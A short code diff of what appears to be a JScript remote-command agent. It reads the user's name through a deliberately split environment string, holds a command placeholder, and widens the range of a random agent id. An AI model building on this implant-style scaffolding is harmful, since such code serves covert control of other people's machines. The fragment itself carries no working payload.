@@ -21,7 +21,7 @@ var un = runner.ExpandEnvironmentStrings("%US"+  "ER"+"NA"+  "ME%");
 
 var curcmnd = '{"cmnd": ""}'
 var retval = ""
-var id = Math.floor(Math.random() * 99999999).toString()
+var id = Math.floor(Math.random() * 9999999999).toString()
 var type = "js"
 
 //Find file we are running in
